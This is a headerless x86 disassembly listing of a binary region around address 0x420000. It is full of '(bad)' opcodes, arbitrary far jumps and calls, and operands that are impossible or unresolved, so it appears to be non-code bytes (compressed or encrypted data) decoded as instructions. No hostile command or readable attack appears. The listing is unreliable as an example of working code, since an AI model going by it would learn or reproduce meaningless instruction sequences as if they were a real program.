  42009c:	(bad)  [ecx-0x6df33287]
  4200a2:	stos   DWORD PTR es:[edi],eax
  4200a3:	and    BYTE PTR [ecx],ch
  4200a5:	and    DWORD PTR [esi],ebx
  4200a7:	mov    cl,0x8c
  4200a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200aa:	fwait
  4200ab:	scas   al,BYTE PTR es:[edi]
  4200ac:	cmp    BYTE PTR [edi+eax*8-0x64],0x69
  4200b1:	imul   ebx,DWORD PTR [edi],0xf241ef9e
  4200b7:	aad    0x15
  4200b9:	(bad)  
  4200ba:	out    0x8d,al
  4200bc:	push   cs
  4200bd:	daa    
  4200be:	jb     0x4200be
  4200c0:	call   0x4885:0xa23ac6a8
  4200c7:	cmp    ebp,DWORD PTR [ecx]
  4200c9:	clc    
  4200ca:	push   cs
  4200cb:	stos   BYTE PTR es:[edi],al
  4200cc:	dec    ebx
  4200cd:	outs   dx,DWORD PTR ds:[esi]
  4200ce:	pop    edx
  4200cf:	jne    0x42010b
  4200d1:	push   eax
  4200d2:	jo     0x420129
  4200d4:	test   DWORD PTR [eax-0x327d2930],ecx
  4200da:	add    eax,ebp
  4200dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200dd:	or     BYTE PTR [edx+0x4acc00e5],ch
  4200e3:	add    al,0x92
  4200e5:	xchg   DWORD PTR [esi-0x67c4a94],ebp
  4200eb:	adc    BYTE PTR [ebx+0x7bd02586],dh
  4200f1:	in     al,dx
  4200f2:	nop
  4200f3:	in     al,0x37
  4200f5:	cmp    dl,BYTE PTR [edi+0xf]
  4200f8:	mov    cl,0xd5
  4200fa:	repnz mov ds:0x106771c4,eax
  420100:	aas    
  420101:	idiv   DWORD PTR [edi-0x3e4d7a49]
  420107:	mov    edx,0xfc011cdb
  42010c:	mov    cl,0xe0
  42010e:	popf   
  42010f:	dec    ebp
  420110:	stos   DWORD PTR es:[edi],eax
  420111:	daa    
  420112:	popf   
  420113:	arpl   di,di
  420115:	jno    0x4200ab
  420117:	ja     0x4200c1
  420119:	cmp    al,0xcf
  42011b:	dec    edx
  42011c:	sub    dh,BYTE PTR [edx+0x1c0140e4]
  420122:	xor    eax,0x601f6e91
  420127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420128:	inc    ecx
  420129:	icebp  
  42012a:	call   0xe5d4:0x2e9003b1
  420131:	sub    edi,esp
  420133:	or     ebp,esp
	...
  420195:	add    BYTE PTR [ebx-0x31],dh
  420198:	fwait
  420199:	cmp    DWORD PTR [edi+0x5dcff37d],edi
  42019f:	xchg   ebp,eax
  4201a0:	xchg   ebx,eax
  4201a1:	dec    edi
  4201a2:	and    al,0x86
  4201a4:	or     eax,0x1547b39
  4201a9:	add    BYTE PTR [edi],al
  4201ab:	add    DWORD PTR [eax],eax
  4201ad:	add    BYTE PTR [ebp+0x27219346],ah
  4201b3:	push   ebx
  4201b4:	push   ecx
  4201b5:	sbb    esi,ebx
  4201b7:	sbb    DWORD PTR [ebp-0x36],ebx
  4201ba:	arpl   WORD PTR [ebx+0x68f0933],di
  4201c0:	pushf  
  4201c1:	jge    0x420177
  4201c3:	mov    ecx,es
  4201c5:	adc    al,0x37
  4201c7:	lods   al,BYTE PTR ds:[esi]
  4201c8:	or     ah,BYTE PTR [eax-0x4d6d54f0]
  4201ce:	jo     0x420177
  4201d0:	pop    eax
  4201d1:	retf   0xc66f
  4201d4:	fcmovu st,st(1)
  4201d6:	cmc    
  4201d7:	and    al,0x23
  4201d9:	js     0x420233
  4201db:	push   ebx
  4201dc:	sub    al,0x81
  4201de:	pop    ds
  4201df:	aas    
  4201e0:	das    
  4201e1:	cmp    dh,al
  4201e3:	(bad)  [edx]
  4201e5:	mov    edx,0xa5c5a235
  4201ea:	sbb    dh,ah
  4201ec:	pop    ecx
  4201ed:	mov    esp,0x9a259da5
  4201f2:	(bad)  
  4201f3:	pusha  
  4201f4:	aam    0x4
  4201f6:	stos   BYTE PTR es:[edi],al
  4201f7:	cs js  0x42022a
  4201fa:	cmp    ch,dl
  4201fc:	mov    bl,0x92
  4201fe:	data16 fnstcw WORD PTR [esi+0x41]
  420202:	xchg   DWORD PTR [esi+0x277ee307],ebx
  420208:	sub    eax,0x3bc836af
  42020d:	push   ss
  42020e:	nop
  42020f:	call   0x5527:0x13f61907
  420216:	push   edx
  420217:	jbe    0x420238
  420219:	push   es
  42021a:	lds    eax,FWORD PTR [ebx+0x1c]
  42021d:	xchg   DWORD PTR [ebx+0x7d],ecx
  420220:	sbb    al,0xf
  420223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420224:	pop    DWORD PTR [eax+edx*4-0x279b3592]
  42022b:	pushf  
  42022c:	mov    eax,0x68abf46d
  420231:	fild   QWORD PTR [eax-0x32]
  420234:	test   eax,0x90cd729
  420239:	dec    esi
  42023a:	xchg   ecx,eax
  42023b:	push   ds
  42023c:	test   al,0xef
  42023e:	lahf   
  42023f:	inc    edi
  420240:	shr    DWORD PTR [edi-0x9],1
  420243:	shl    BYTE PTR [ebx+esi*8+0x4964088c],0x85
  42024b:	repnz (bad) 
  42024e:	and    eax,edx
  420250:	aaa    
  420251:	lahf   
  420252:	dec    ebp
  420253:	jo     0x420213
  420255:	sub    edi,DWORD PTR [ebx+0x7c]
  420258:	adc    bl,BYTE PTR [ebp+0x10]
  42025b:	xchg   esi,eax
  42025c:	push   0x2d67381d
  420261:	xor    BYTE PTR [ebx],0x9d
  420264:	outs   dx,BYTE PTR ds:[esi]
  420265:	jo     0x4202b1
  420267:	xchg   DWORD PTR [eax+0x5a],ebp
  42026a:	mul    BYTE PTR [ecx]
  42026c:	sub    DWORD PTR [edi],0x1524cc2d
  420272:	jb     0x4202ea
  420274:	(bad)  
  420275:	outs   dx,DWORD PTR ds:[esi]
  420276:	push   ecx
  420277:	out    dx,al
  420278:	lods   eax,DWORD PTR ds:[esi]
  420279:	jmp    0xf45ee892
  42027e:	cmp    al,0x67
  420280:	adc    al,0xd5
  420282:	push   es
  420283:	xor    BYTE PTR [eax-0x1166aa6a],dl
  420289:	out    0xdb,al
  42028b:	sbb    BYTE PTR [edi],dl
  42028d:	inc    esi
  42028e:	call   0x1094ef50
  420293:	adc    al,0x16
  420295:	pop    es
  420296:	cmp    esi,DWORD PTR [eax-0x3c963fe]
  42029c:	(bad)  
  42029d:	pop    esi
  42029e:	sub    bh,BYTE PTR [esi]
  4202a0:	or     esi,ecx
  4202a2:	jnp    0x4202fb
  4202a4:	ins    BYTE PTR es:[edi],dx
  4202a5:	aaa    
  4202a6:	xchg   ebx,eax
  4202a7:	pop    es
  4202a8:	iret   
  4202a9:	or     esi,DWORD PTR [ecx-0x20]
  4202ac:	sahf   
  4202ad:	ror    BYTE PTR [esi-0x2e],1
  4202b0:	mov    dl,ah
  4202b2:	xchg   edx,eax
  4202b3:	aas    
  4202b4:	add    BYTE PTR fs:[eax],al
	...
  420313:	add    BYTE PTR [eax],al
  420315:	add    BYTE PTR [ecx+0x6],al
  420318:	clc    
  420319:	mov    esi,0xff47feff
  42031e:	mov    cl,0x27
  420320:	pop    ebx
  420321:	fucomip st,st(3)
  420323:	pop    ebx
  420324:	shr    DWORD PTR [edi],0x82
  420327:	push   ebp
  420328:	add    DWORD PTR [eax],eax
  42032a:	pop    es
  42032b:	add    DWORD PTR [eax],eax
  42032d:	add    BYTE PTR ds:0xdd77b3d2,cl
  420333:	icebp  
  420334:	sbb    al,0xa4
  420336:	jnp    0x420363
  420338:	xor    dh,bl
  42033a:	xchg   edi,eax
  42033b:	sbb    BYTE PTR cs:[ebp+0x7b],dh
  42033f:	imul   ecx,DWORD PTR [eax+0x13],0x8e5bd796
  420346:	sub    esi,0xffffff94
  420349:	pop    ebx
  42034a:	out    0x36,al
  42034c:	inc    edx
  42034d:	cdq    
  42034e:	lds    ebp,FWORD PTR [esi+0x72]
  420351:	pusha  
  420352:	cli    
  420353:	mov    esp,?
  420355:	xchg   ecx,esi
  420357:	in     eax,0x79
  420359:	into   
  42035a:	fld    DWORD PTR [edi+0x1639f672]
  420360:	xor    cl,bh
  420362:	stos   BYTE PTR es:[di],al
  420364:	ss jmp 0xacecf345
  42036a:	xchg   ah,al
  42036c:	xchg   DWORD PTR [ecx],esi
  42036e:	jle    0x42034e
  420370:	sub    ch,dh
  420372:	inc    eax
  420373:	test   al,0xf3
  420375:	xchg   ecx,eax
  420376:	pop    esp
  420377:	sbb    DWORD PTR [edi+edi*2],ebp
  42037a:	test   DWORD PTR [ecx-0x3f],ebx
  42037d:	inc    edi
  42037e:	cmp    eax,ecx
  420380:	adc    cl,BYTE PTR [ebx+0x78]
  420383:	cld    
  420384:	pop    esp
  420385:	xchg   ax,ax
  420387:	xchg   ebx,eax
  420388:	ret    0x58be
  42038b:	mov    ds,WORD PTR [eax+0x6f]
  42038e:	jg     0x4203fc
  420390:	jmp    FWORD PTR [edi]
  420392:	(bad)  
  420393:	ja     0x4203c9
  420395:	xchg   ebx,eax
  420396:	or     dh,bl
  420398:	out    dx,eax
  420399:	retf   0x4d1d
  42039c:	sar    DWORD PTR [esi],cl
  42039e:	jl     0x4203d1
  4203a0:	and    DWORD PTR [ebx],0x3f
  4203a3:	(bad)  
  4203a4:	shl    BYTE PTR [esi+0x26ed8312],0x71
  4203ab:	int3   
  4203ac:	(bad)  
  4203ad:	cdq    
  4203ae:	xchg   edx,eax
  4203af:	push   ebp
  4203b0:	imul   ebx,DWORD PTR [esi+0x15],0x48
  4203b4:	dec    esp
  4203b5:	or     ch,BYTE PTR [edi+0x60eda39e]
  4203bb:	jns    0x42038b
  4203bd:	xchg   al,ch
  4203bf:	test   al,0xfd
  4203c1:	(bad)  
  4203c2:	jmp    0x4ecee0ba
  4203c7:	cmp    BYTE PTR [ebp+0x76],cl
  4203ca:	out    dx,al
  4203cb:	xor    eax,0x57e18368
  4203d0:	mov    ebp,0xe0b04242
  4203d5:	mov    bh,0x11
  4203d7:	les    ebx,FWORD PTR [ebx-0x45]
  4203da:	mov    edi,0xb7abec0d
  4203df:	cmp    al,0x49
  4203e1:	mov    edx,0x48799b9a
  4203e6:	(bad)  
  4203e7:	mov    dl,0xa7
  4203e9:	std    
  4203ea:	jbe    0x42043a
  4203ec:	in     al,dx
  4203ed:	jp     0x4203f0
  4203ef:	in     eax,0xf8
  4203f1:	inc    esp
  4203f2:	sub    al,0xcd
  4203f4:	adc    DWORD PTR [edx-0x51],ebx
  4203f7:	adc    eax,0x25900106
  4203fc:	test   eax,0x925fb89d
  420401:	daa    
  420402:	in     al,0x57
  420404:	jae    0x4203db
  420406:	jmp    0xa0c9:0x856b4fa0
  42040d:	inc    ebx
  42040e:	mov    eax,ds:0xec35fa5c
  420413:	scas   al,BYTE PTR es:[edi]
  420414:	xor    bh,BYTE PTR [ecx-0x48f51309]
  42041a:	push   edx
  42041b:	pop    edx
  42041c:	fs (bad) 
  42041e:	call   DWORD PTR [edx-0x20]
  420421:	jbe    0x4203e7
  420423:	fnsave ds:0x3347216f
  420429:	loop   0x420471
  42042b:	push   0x7c44d134
  420430:	inc    edi
  420431:	shl    BYTE PTR [ebx],0x24
  420434:	xor    al,0x0
	...
  420496:	scas   al,BYTE PTR es:[edi]
  420497:	xchg   esp,eax
  420498:	push   edi
  420499:	adc    bh,BYTE PTR [edi-0x2d]
  42049c:	out    dx,eax
  42049d:	mov    esp,0xb41496f0
  4204a2:	fs sub ebx,ecx
  4204a5:	ins    BYTE PTR es:[edi],dx
  4204a6:	mov    DWORD PTR [esi+0x1],edx
  4204a9:	add    BYTE PTR [edi],al
  4204ab:	add    DWORD PTR [eax],eax
  4204ad:	add    BYTE PTR [edi],dh
  4204af:	sbb    BYTE PTR [ebx+eax*2],ah
  4204b2:	test   DWORD PTR [ebx],edx
  4204b4:	clc    
  4204b5:	fs ds test al,0xb9
  4204b9:	jmp    0x42052a
  4204bb:	and    cl,BYTE PTR [ebx-0xb]
  4204be:	cmp    dh,BYTE PTR [eax]
  4204c0:	pushf  
  4204c1:	int3   
  4204c2:	mov    ebp,0xb38cc036
  4204c7:	gs out 0x1e,eax
  4204ca:	iret   
  4204cb:	sub    ax,WORD PTR [eax+0x77]
  4204cf:	leave  
  4204d0:	sahf   
  4204d1:	jo     0x4204c2
  4204d3:	shl    BYTE PTR [ecx+0x41],cl
  4204d6:	push   esi
  4204d7:	outs   dx,DWORD PTR ds:[esi]
  4204d8:	pop    ebx
  4204d9:	(bad)  
  4204da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204db:	lahf   
  4204dc:	mov    esp,0x6a2eb682
  4204e1:	dec    BYTE PTR [ecx-0x7cc2ed96]
  4204e7:	xor    dl,BYTE PTR [ebx-0x6f]
  4204ea:	pop    esi
  4204eb:	mov    BYTE PTR [ebp-0xe787959],al
  4204f1:	xor    al,0x2c
  4204f3:	(bad)  
  4204f5:	pop    ebp
  4204f7:	inc    ecx
  4204f8:	or     esp,DWORD PTR [ecx+0x50]
  4204fb:	inc    ebp
  4204fc:	imul   BYTE PTR [ebx-0x16]
  4204ff:	push   ecx
  420500:	mov    edi,0x7bd03a3f
  420505:	dec    edi
  420506:	push   es
  420507:	call   0x70375616
  42050c:	mov    bh,0xfe
  42050e:	pop    eax
  42050f:	div    dh
  420511:	inc    ebp
  420512:	and    BYTE PTR [ebp-0x11b3935],dh
  420518:	pushf  
  420519:	(bad)  
  42051a:	xchg   BYTE PTR [esi-0x26],ah
  42051d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42051f:	addr16 retf 
  420521:	or     eax,0x3254e490
  420526:	xor    DWORD PTR [eax+esi*8],edx
  420529:	test   BYTE PTR [eax+ecx*4],dh
  42052c:	sub    cl,bl
  42052e:	xlat   BYTE PTR ds:[ebx]
  42052f:	jne    0x42057a
  420531:	ins    BYTE PTR es:[edi],dx
  420532:	outs   dx,BYTE PTR ds:[esi]
  420533:	in     eax,0xf4
  420535:	pop    esi
  420536:	dec    esi
  420537:	pop    esp
  420538:	nop
  420539:	mov    edx,0xe82f6209
  42053e:	loopne 0x4205b7
  420540:	sub    ah,dl
  420542:	dec    ecx
  420543:	add    al,0xa3
  420545:	ja     0x42050c
  420547:	das    
  420548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420549:	mov    edx,0x887a81ce
  42054e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42054f:	pusha  
  420550:	dec    ecx
  420551:	mov    ds:0xa8231a3d,al
  420556:	fist   DWORD PTR [ecx+0x21534473]
  42055c:	in     al,0x58
  42055e:	or     esp,DWORD PTR [edx]
  420560:	dec    eax
  420561:	call   0xc17c8e3d
  420566:	gs je  0x42052e
  420569:	sub    edx,esi
  42056b:	jecxz  0x42054b
  42056d:	fdivr  st(1),st
  42056f:	aad    0xeb
  420571:	shr    BYTE PTR [ecx-0x4b443e3e],cl
  420577:	or     ebp,esp
  420579:	push   0xf85722d4
  42057e:	push   ecx
  42057f:	js     0x42050c
  420581:	xor    BYTE PTR [ecx+0x22],0xc6
  420585:	ret    0xf173
  420588:	xchg   esi,eax
  42058a:	adc    al,0x92
  42058c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42058d:	and    DWORD PTR [esi+0xd4f78f3],edx
  420593:	and    bh,BYTE PTR [eax]
  420595:	mov    eax,ds:0x48d19f42
  42059a:	xor    edx,edx
  42059c:	in     eax,0x17
  42059e:	fidivr DWORD PTR [edx+0x65]
  4205a1:	push   ebx
  4205a2:	outs   dx,BYTE PTR ds:[esi]
  4205a3:	aad    0xb9
  4205a5:	add    al,0xac
  4205a7:	jge    0x420594
  4205a9:	or     ecx,ebp
  4205ab:	int    0x3b
  4205ad:	jb     0x420530
  4205af:	add    ch,bh
  4205b1:	jbe    0x4205f2
  4205b3:	add    bl,BYTE PTR [esi]
	...
  420615:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42061c:	mov    ah,0xec
  42061e:	btc    DWORD PTR [edx],edx
  420621:	mov    ebx,0x2bf38589
  420626:	nop
  420627:	push   edi
  420628:	add    DWORD PTR [eax],eax
  42062a:	pop    es
  42062b:	add    DWORD PTR [eax],eax
  42062d:	add    BYTE PTR [ebp+0x10e8b531],dl
  420633:	cli    
  420634:	pusha  
  420635:	pop    ss
  420636:	xor    ebp,DWORD PTR fs:[ebp-0x72805def]
  42063d:	xchg   ebx,eax
  42063e:	lods   al,BYTE PTR ds:[esi]
  42063f:	cwde   
  420640:	xor    ah,bl
  420642:	dec    ebx
  420643:	fimul  DWORD PTR [eax+0xa]
  420646:	push   edx
  420647:	dec    ebp
  420648:	icebp  
  420649:	cmp    al,BYTE PTR [ebp-0x6a]
  42064c:	xchg   BYTE PTR [edx+0x59c49f8],al
  420652:	retf   
  420653:	mov    eax,ds:0x3319a0a6
  420658:	retf   
  420659:	pop    DWORD PTR [edx+0x4d]
  42065c:	inc    esp
  42065d:	xor    edx,eax
  42065f:	mov    al,0x35
  420661:	xchg   ecx,eax
  420662:	pop    ebx
  420663:	outs   dx,BYTE PTR ds:[esi]
  420664:	iret   
  420665:	nop
  420666:	(bad)  
  420668:	lds    edi,FWORD PTR [edi-0x13]
  42066b:	pop    eax
  42066c:	test   eax,0x10bc0c3
  420671:	out    dx,eax
  420672:	clc    
  420673:	sahf   
  420674:	test   bl,dl
  420676:	outs   dx,DWORD PTR ds:[esi]
  420677:	jg     0x42061b
  420679:	mov    ?,WORD PTR [edx-0x10]
  42067c:	mov    edi,DWORD PTR [eax]
  42067e:	sub    bh,ah
  420680:	ret    
  420681:	inc    esi
  420682:	fs popa 
  420684:	mov    edx,ebx
  420686:	jns    0x420704
  420688:	ret    
  420689:	mov    eax,ds:0x4147160
  42068e:	leave  
  42068f:	inc    esi
  420690:	lea    edi,[ebx+0x1bfac0cd]
  420696:	add    BYTE PTR [ebp-0x76],bl
  420699:	pop    edx
  42069a:	or     ah,ah
  42069c:	dec    esp
  42069d:	add    eax,0xe086f80c
  4206a2:	adc    al,0x8
  4206a4:	in     al,0x74
  4206a6:	and    DWORD PTR [esi+eiz*1-0x27],0xffffffb7
  4206ab:	les    edi,FWORD PTR [edx-0x70]
  4206ae:	jnp    0x420667
  4206b0:	push   0x3ff74cd9
  4206b5:	ja     0x42072b
  4206b7:	mov    esi,0x84d99c5
  4206bc:	lods   al,BYTE PTR ds:[esi]
  4206bd:	(bad)  [esi+0x21]
  4206c0:	push   0xffffff9f
  4206c2:	xchg   ebp,eax
  4206c3:	mov    dl,0x83
  4206c5:	nop
  4206c6:	jecxz  0x4206a5
  4206c8:	div    bl
  4206ca:	pop    edi
  4206cb:	shl    BYTE PTR [ecx],cl
  4206cd:	mov    al,0x6e
  4206cf:	cmp    DWORD PTR [eax+0x588bf28c],edi
  4206d5:	clc    
  4206d6:	adc    BYTE PTR ds:[esi],ch
  4206d9:	cmovne eax,DWORD PTR [ebx+0x28]
  4206dd:	jmp    0x3a25:0x49ca519
  4206e4:	and    BYTE PTR [ecx+eiz*1+0x7bb05f4e],dl
  4206eb:	std    
  4206ec:	dec    eax
  4206ed:	(bad)  
  4206ee:	fidivr WORD PTR [ecx+edx*4-0x33b06cd5]
  4206f5:	call   0x63a9:0x4748060e
  4206fc:	pusha  
  4206fd:	mov    bl,0x17
  4206ff:	loope  0x4206a4
  420701:	pop    edi
  420702:	call   0x65f74d34
  420707:	cmp    ah,al
  420709:	outs   dx,BYTE PTR ds:[esi]
  42070a:	and    dl,ah
  42070c:	lock sub al,BYTE PTR [eax]
  42070f:	sub    eax,edi
  420711:	or     al,0xef
  420713:	adc    BYTE PTR [edi],bh
  420715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420716:	jns    0x4206a8
  420718:	pusha  
  420719:	adc    al,0xae
  42071b:	daa    
  42071c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42071e:	fcmovu st,st(7)
  420720:	mov    ebp,0xe9cc6220
  420725:	mov    WORD PTR [esi],ds
  420727:	popf   
  420728:	pushf  
  420729:	out    dx,al
  42072a:	fimul  WORD PTR [esi+0x5b]
  42072d:	js     0x420735
  42072f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420730:	xor    DWORD PTR [eax+ecx*1+0x9],ecx
  420734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  420795:	add    BYTE PTR [ecx-0x587fdad1],cl
  42079b:	mov    ch,BYTE PTR [ebp-0x642816d1]
  4207a1:	sub    ebp,esp
  4207a3:	pop    esi
  4207a4:	pusha  
  4207a5:	rcl    BYTE PTR [edi+0x7000158],cl
  4207ab:	add    DWORD PTR [eax],eax
  4207ad:	add    bl,dl
  4207af:	add    al,0xdf
  4207b1:	inc    ecx
  4207b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207b3:	add    ah,BYTE PTR [ebx]
  4207b5:	popf   
  4207b6:	aas    
  4207b7:	dec    ebx
  4207b8:	aad    0xdc
  4207ba:	push   cs
  4207bb:	popa   
  4207bc:	mov    edx,0x8b443df7
  4207c1:	ss sbb al,0x50
  4207c4:	dec    ecx
  4207c5:	je     0x420843
  4207c7:	cmp    DWORD PTR [ecx-0x6f],ebx
  4207ca:	imul   edi,DWORD PTR ds:0xeddc9627,0xb0310aea
  4207d4:	jle    0x420805
  4207d6:	in     al,0x59
  4207d8:	push   es
  4207d9:	mov    ah,0xb8
  4207db:	jmp    edi
  4207dd:	cmc    
  4207de:	cmp    esp,DWORD PTR [ecx+0x7124f4de]
  4207e4:	pop    ds
  4207e5:	jp     0x42085a
  4207e7:	dec    ebx
  4207e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207e9:	outs   dx,DWORD PTR ds:[esi]
  4207ea:	mov    ebx,0xb094dd5d
  4207ef:	mov    ebp,0x9bb5e277
  4207f4:	xor    dh,bl
  4207f6:	(bad)  [ebp+0x18b2113c]
  4207fc:	test   BYTE PTR [edx-0x163cf35c],bl
  420802:	add    BYTE PTR [ebx-0x6fd6ca2c],0x6d
  420809:	mov    DWORD PTR [eax-0x7c],0x8f8c15cf
  420810:	push   ecx
  420811:	mov    ebp,0x4973e3f3
  420816:	nop
  420817:	test   DWORD PTR [ebx+0x4d291a38],esi
  42081d:	lods   eax,DWORD PTR ds:[esi]
  42081e:	out    dx,eax
  42081f:	pop    DWORD PTR [esi+edi*4-0x45]
  420823:	hlt    
  420824:	jno    0x420849
  420826:	jbe    0x42087f
  420828:	pop    edi
  420829:	mov    esi,0xbbf24a60
  42082e:	enter  0xb32f,0x97
  420832:	bound  ebx,QWORD PTR [eax+0x6]
  420835:	js     0x42083a
  420837:	push   edi
  420838:	and    DWORD PTR [ebx],ebx
  42083a:	(bad)  
  42083e:	sub    eax,0x76c3403c
  420843:	mov    esi,0xf260b912
  420848:	lods   al,BYTE PTR ds:[esi]
  420849:	cmp    esi,DWORD PTR [edx-0x78]
  42084c:	push   0xffffffa5
  42084e:	outs   dx,DWORD PTR ds:[esi]
  42084f:	xor    edi,eax
  420851:	mov    dl,0x39
  420853:	mov    ah,BYTE PTR ds:[ecx-0x7c6f07ed]
  42085a:	ss inc esi
  42085c:	ret    0xd7e3
  42085f:	stos   DWORD PTR es:[edi],eax
  420860:	ret    0x3f2f
  420863:	ds call 0xe38a1bd6
  420869:	jecxz  0x420888
  42086b:	ins    DWORD PTR es:[edi],dx
  42086c:	or     DWORD PTR [edi-0x74a694f8],esi
  420872:	sbb    ah,BYTE PTR [edx+0x73ded908]
  420878:	mov    bl,0x1d
  42087a:	out    dx,eax
  42087b:	dec    ebx
  42087c:	xchg   ecx,eax
  42087d:	mov    eax,ds
  42087f:	in     al,dx
  420880:	pop    esi
  420881:	xchg   ebx,eax
  420882:	dec    ebx
  420883:	xchg   esp,eax
  420884:	repnz xor DWORD PTR [ecx+edi*4-0x33],ebx
  420889:	xor    eax,0xdc30746d
  42088e:	inc    ebp
  42088f:	adc    DWORD PTR [esi-0x68cad589],edi
  420895:	xchg   ebp,eax
  420896:	pop    ebp
  420897:	add    DWORD PTR [edi+eax*2-0x478ce652],ecx
  42089e:	loopne 0x420827
  4208a0:	xor    eax,DWORD PTR [ebx-0x24]
  4208a3:	pop    ebx
  4208a4:	cld    
  4208a5:	fdivr  DWORD PTR [esi+ebp*2-0x645cc93c]
  4208ac:	inc    ebx
  4208ad:	mul    esi
  4208af:	mov    ebp,0x8d076a5c
  4208b4:	mov    dh,0x0
	...
  420916:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42091d:	mov    ch,0x79
  42091f:	jne    0x42092f
  420921:	ret    0x90b7
  420924:	pop    esp
  420925:	sbb    al,0x9e
  420927:	pop    ecx
  420928:	add    DWORD PTR [eax],eax
  42092a:	pop    es
  42092b:	add    DWORD PTR [eax],eax
  42092d:	add    BYTE PTR [ebp-0x660b7b00],bh
  420933:	adc    al,0x90
  420935:	rol    BYTE PTR [ebx],0xa1
  420938:	(bad)  
  42093a:	dec    ebp
  42093b:	mov    esi,0x4397bee2
  420940:	mov    ds:0x2559f92,eax
  420945:	lods   al,BYTE PTR ds:[esi]
  420946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420947:	mov    cl,BYTE PTR [esi+0x257c638a]
  42094d:	fist   WORD PTR [ebp-0x3de01950]
  420953:	mov    dh,0x62
  420955:	sbb    eax,DWORD PTR [esi]
  420957:	pop    esp
  420958:	sub    al,0xef
  42095a:	or     al,0xef
  42095c:	push   0xa5bcbbc4
  420961:	inc    dh
  420963:	jge    0x42095a
  420965:	popf   
  420966:	pop    eax
  420967:	shl    bl,1
  420969:	repz xchg ecx,eax
  42096b:	pop    edi
  42096c:	iret   
  42096d:	lahf   
  42096e:	clc    
  42096f:	mov    WORD PTR [ecx-0x4bb584ca],gs
  420975:	push   esp
  420976:	inc    esp
  420977:	jp     0x420937
  420979:	adc    esp,ebx
  42097b:	rcl    BYTE PTR [ecx-0x13],0x46
  42097f:	sbb    DWORD PTR [edi+0x4176046c],esi
  420985:	pop    eax
  420986:	mov    ebx,0xea4cc140
  42098b:	popf   
  42098c:	fwait
  42098d:	call   0xc394aace
  420992:	fisub  WORD PTR ds:0xc02babca
  420998:	sub    DWORD PTR [esi-0x514e67c1],ebp
  42099e:	(bad)  
  42099f:	jns    0x4209d2
  4209a1:	mov    edx,0x90f073bb
  4209a6:	(bad)  
  4209a7:	jbe    0x4209b6
  4209a9:	std    
  4209aa:	(bad)  
  4209ab:	shr    ecx,cl
  4209ad:	sub    cl,BYTE PTR [ebx-0x5f]
  4209b0:	mov    dh,0xb1
  4209b2:	pop    ebx
  4209b3:	inc    eax
  4209b4:	adc    ebp,ebp
  4209b6:	xchg   esp,eax
  4209b7:	sbb    DWORD PTR [esi-0x58],esp
  4209ba:	aad    0x6f
  4209bc:	sahf   
  4209bd:	xor    DWORD PTR [eax],ebp
  4209bf:	xor    BYTE PTR [ecx+0x17216cd9],dh
  4209c5:	jmp    0x7076:0x9f77d94b
  4209cc:	cld    
  4209cd:	and    esp,DWORD PTR [eax-0x41]
  4209d0:	pop    edi
  4209d1:	imul   ebx,DWORD PTR [eax-0x39],0x897b2805
  4209d8:	pop    ss
  4209d9:	jns    0x420a31
  4209db:	jno    0x4209d1
  4209dd:	cwde   
  4209de:	push   ds
  4209df:	inc    ebp
  4209e0:	ja     0x4209b7
  4209e2:	push   eax
  4209e3:	jmp    0x420a0d
  4209e5:	inc    ebx
  4209e6:	test   eax,0x9d8866cf
  4209eb:	dec    esi
  4209ec:	push   0x5c
  4209ee:	push   eax
  4209ef:	xor    al,0xb9
  4209f1:	push   esi
  4209f2:	repnz push ecx
  4209f4:	test   DWORD PTR [ecx],esi
  4209f6:	stos   BYTE PTR es:[edi],al
  4209f7:	push   esp
  4209f8:	(bad)
  4209fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209fc:	adc    esi,ebp
  4209fe:	pop    ecx
  4209ff:	push   eax
  420a00:	dec    ecx
  420a01:	aad    0xe2
  420a03:	push   ebp
  420a04:	xor    eax,0x5d4f7ea8
  420a09:	or     BYTE PTR [ebx+0x6e4d2920],al
  420a0f:	mov    al,0x64
  420a11:	or     al,0x8f
  420a13:	lds    ebx,FWORD PTR [ebx+0x7ef41a73]
  420a19:	(bad)  
  420a1a:	nop
  420a1b:	fild   WORD PTR [esi+0x7fcba85]
  420a21:	add    DWORD PTR [ebp-0x7647e6cf],esp
  420a27:	retf   
  420a28:	mov    eax,0xeaf8b6ed
  420a2d:	ficom  DWORD PTR ds:0x8ce4cb69
  420a33:	jecxz  0x420a2d
	...
  420a95:	add    bh,bl
  420a97:	xor    ch,BYTE PTR [edi-0x6010ed]
  420a9d:	(bad)  
  420a9e:	(bad)  
  420aa0:	std    
  420aa1:	test   al,ah
  420aa3:	pop    ebp
  420aa4:	setbe  BYTE PTR [ebp+0x700015a]
  420aab:	add    DWORD PTR [eax],eax
  420aad:	add    BYTE PTR [esi+0x533c2fd1],ah
  420ab3:	ret    
  420ab4:	or     eax,0x20cd8565
  420ab9:	leave  
  420aba:	addr16 int 0xd0
  420abd:	outs   dx,DWORD PTR ds:[esi]
  420abe:	dec    eax
  420abf:	cmp    eax,DWORD PTR [ecx]
  420ac1:	add    esp,edx
  420ac3:	shr    BYTE PTR [edx-0x2afb81fb],1
  420ac9:	mov    edi,0xa2806b22
  420ace:	cmp    cl,BYTE PTR [edx+ecx*4-0x125a416]
  420ad5:	mov    cl,BYTE PTR ds:0xb7c81201
  420adb:	jmp    0xfe6c:0xba497586
  420ae2:	cmp    cl,BYTE PTR [ecx+0x38]
  420ae5:	push   ecx
  420ae6:	cld    
  420ae7:	mov    edi,0xe946a646
